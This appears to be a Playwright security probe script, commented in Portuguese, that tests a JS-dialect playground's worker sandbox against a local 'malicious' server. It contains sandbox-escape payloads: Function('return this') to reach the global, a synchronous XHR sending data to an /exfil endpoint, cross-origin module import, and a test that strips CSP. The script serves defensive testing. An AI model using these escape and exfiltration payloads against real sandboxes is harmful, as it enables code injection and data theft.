// Probe de sandbox no BROWSER REAL (Chromium headless-shell em cache) contra o build de produção
// do playground (next start na 3101) e um servidor "malvado" 100% local (127.0.0.1:4999).
// Somente leitura em relação ao repo. Nenhuma rede externa.
import http from 'node:http';
import { createRequire } from 'node:module';
import { writeFileSync } from 'node:fs';

const require = createRequire(import.meta.url);
const { chromium } = require('<repo>/node_modules/.pnpm/playwright-core@1.60.0/node_modules/playwright-core');

const BASE = 'http://127.0.0.1:3101';
const EVIL_PORT = 4999;
const HEADLESS_SHELL =
  '<home>/.cache/ms-playwright/chromium_headless_shell-1243/chrome-headless-shell-linux64/chrome-headless-shell';
const OUT = process.argv[2];

// ---------- servidor "malvado" local ----------
const hits = [];
const evil = http.createServer((req, res) => {
  hits.push({ method: req.method, url: req.url, origin: req.headers.origin ?? null, at: Date.now() });
  const cors = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*' };
  if (req.url.startsWith('/evil.mjs')) {
    res.writeHead(200, { ...cors, 'Content-Type': 'application/javascript' });
    res.end('globalThis.__evil_module_ran = true; export default 42;');
    return;
  }
  res.writeHead(200, { ...cors, 'Content-Type': 'text/plain' });
  res.end('EVIL-OK');
});
await new Promise((r) => evil.listen(EVIL_PORT, '127.0.0.1', r));

const browser = await chromium.launch({ executablePath: HEADLESS_SHELL });
const results = [];

async function newPage({ stripCsp = false } = {}) {
  const context = await browser.newContext();
  if (stripCsp) {
    await context.route('**/*', async (route) => {
      if (!route.request().url().startsWith(BASE)) return route.continue();
      const r = await route.fetch();
      const headers = { ...r.headers() };
      delete headers['content-security-policy'];
      await route.fulfill({ response: r, headers });
    });
  }
  const page = await context.newPage();
  const consoleMsgs = [];
  page.on('console', (m) => consoleMsgs.push(`${m.type()}: ${m.text()}`.slice(0, 400)));
  page.on('pageerror', (e) => consoleMsgs.push(`pageerror: ${String(e.message).slice(0, 300)}`));
  return { page, context, consoleMsgs };
}

async function setCode(page, code) {
  await page.goto(BASE + '/');
  await page.locator('.monaco-editor').first().waitFor({ state: 'visible', timeout: 20000 });
  await page.waitForFunction(() => window.monaco && window.monaco.editor.getModels().length > 0, null, { timeout: 20000 });
  // espera o autoload do exemplo terminar (ele só troca o código se o state ainda for o STARTER)
  await page.waitForFunction(() => window.monaco.editor.getModels()[0].getValue().includes('Eai sô'), null, { timeout: 20000 });
  await page.evaluate((c) => window.monaco.editor.getModels()[0].setValue(c), code);
  const ok = await page.evaluate((c) => window.monaco.editor.getModels()[0].getValue() === c, code);
  if (!ok) throw new Error('setValue não colou no modelo');
}

async function runAndRead(page, { waitFinal = 15000 } = {}) {
  const t0 = Date.now();
  await page.getByRole('button', { name: /Bota pra moer/i }).click();
  const status = page.getByRole('status');
  await status.filter({ hasText: /Rodou bonito|Deu ruim|travou/ }).waitFor({ timeout: waitFinal });
  const elapsedMs = Date.now() - t0;
  const statusText = (await status.innerText()).trim();
  const saida = (await page.getByRole('tabpanel').innerText()).trim();
  await page.getByRole('tab', { name: 'Erros' }).click();
  const erros = (await page.getByRole('tabpanel').innerText()).trim();
  await page.getByRole('tab', { name: 'JS gerado' }).click();
  const js = (await page.getByRole('tabpanel').innerText()).trim();
  return { elapsedMs, statusText, saida, erros, jsLines: js.split('\n').length, jsHead: js.split('\n').slice(0, 3).join(' | '), jsTail: js.split('\n').slice(-4).join(' | ') };
}

async function runCase(name, code, opts = {}) {
  const { stripCsp = false, settleMs = 0, evilPath = null } = opts;
  const before = hits.length;
  const { page, context, consoleMsgs } = await newPage({ stripCsp });
  let r;
  try {
    await setCode(page, code);
    r = await runAndRead(page, opts);
    if (settleMs) await page.waitForTimeout(settleMs);
  } catch (e) {
    r = { error: String(e.message).slice(0, 300) };
  }
  const newHits = hits.slice(before).filter((h) => !evilPath || h.url.startsWith(evilPath));
  const entry = { name, stripCsp, ...r, evilHits: newHits.map((h) => `${h.method} ${h.url}`), console: consoleMsgs.filter((m) => !/Download the React DevTools/.test(m)) };
  results.push(entry);
  console.log('\n=== ' + name + (stripCsp ? '  [CSP REMOVIDO via route]' : ''));
  console.log(JSON.stringify(entry, null, 1).slice(0, 2600));
  await context.close();
  return entry;
}

// ---------- casos ----------
const XHR_ESCAPE = (tag) => `
uai G é Function("return this")();
prosa("global do worker:", G.constructor.name, "| fetch:", typeof G.fetch);
uai x é faz_um G.XMLHttpRequest();
tenta_aí {
  x.open("GET", "http://127.0.0.1:${EVIL_PORT}/exfil?tag=${tag}", false);
  x.send();
  prosa("XHR sincrono status:", x.status, "corpo:", x.responseText);
} se_der_ruim (e) {
  prosa("XHR sincrono falhou:", e.name, "-", e.message);
}`;

await runCase('E1 controle: fetch direto', 'fetch("http://127.0.0.1:4999/direto")', { evilPath: '/direto' });
await runCase('E2 escape + XHR sincrono, CSP LIGADO (como no build)', XHR_ESCAPE('csp-on'), { evilPath: '/exfil' });
await runCase('E3 escape + XHR sincrono, CSP REMOVIDO (simula header ausente)', XHR_ESCAPE('csp-off'), { stripCsp: true, evilPath: '/exfil' });
await runCase('E4 import() cross-origin, CSP LIGADO', 'import("http://127.0.0.1:4999/evil.mjs?on").then(m => prosa("import ok", m.default)).catch(e => prosa("import erro:", e.message)); prosa("disparado")', { settleMs: 800, evilPath: '/evil.mjs' });
await runCase('E5 import() cross-origin, CSP REMOVIDO', 'import("http://127.0.0.1:4999/evil.mjs?off").then(m => prosa("import ok", m.default)).catch(e => prosa("import erro:", e.message)); prosa("disparado")', { stripCsp: true, settleMs: 800, evilPath: '/evil.mjs' });
await runCase('E6 importScripts no worker module', 'uai G é Function("return this")(); tenta_aí { G.importScripts("/x.js"); prosa("importScripts executou"); } se_der_ruim (e) { prosa("importScripts:", e.name, "-", e.message); }');
await runCase('E7 superficie de exfil alternativa no worker (sem CSP cobrir)', 'uai G é Function("return this")(); prosa("RTCPeerConnection:", typeof G.RTCPeerConnection, "| WebTransport:", typeof G.WebTransport, "| BroadcastChannel:", typeof G.BroadcastChannel, "| sendBeacon:", typeof G.navigator.sendBeacon, "| OPFS:", typeof (G.navigator.storage && G.navigator.storage.getDirectory), "| indexedDB:", typeof G.indexedDB, "| postMessage:", typeof G.postMessage)');
await runCase('E8 setTimeout com STRING (eval-like) no worker', 'uai G é Function("return this")(); tenta_aí { G.setTimeout("self.__viaTimerString = 1", 0); prosa("setTimeout(string) aceito"); } se_der_ruim (e) { prosa("setTimeout(string):", e.name, e.message); }');
await runCase('E9 postMessage forjado (SEM escape: postMessage nao esta sombreado)', 'postMessage({ type: "ok", logs: 5, js: "" }); prosa("forjei uma mensagem pro main thread")');
await runCase('E10 saida assincrona (setTimeout) e promessa', 'depois_de(50, faz_trem() { prosa("tarde (setTimeout)"); });\nPromise.resolve().then(() => prosa("tarde (microtask)"));\nprosa("cedo");');
await runCase('E11 loop infinito: log incremental + timeout 3s', 'prosa("antes do loop");\nenquanto_tiver (certeza) { }', { waitFinal: 15000 });
await runCase('E12 mensagem de erro de runtime (idioma)', 'prosa(naoExiste);');
await runCase('E13 erro de compilacao (idioma)', 'se (certeza) {');
await runCase('E14 formatacao de valores no painel', 'prosa(0/0); prosa(1/0); prosa(certeza); prosa(de_jeito_nenhum); prosa(nada); prosa(indefinido); prosa([nada, 1, indefinido]); prosa({a: nada}); prosa(Symbol("x")); prosa(new Map([[1,2]])); prosa(new Set([1,2])); prosa(new Date(0)); prosa(10n); prosa(-0);');

writeFileSync(OUT, JSON.stringify(results, null, 2));
await browser.close();
evil.close();
console.log('\nTOTAL de hits no servidor malvado:', hits.length, JSON.stringify(hits.map((h) => `${h.method} ${h.url}`)));
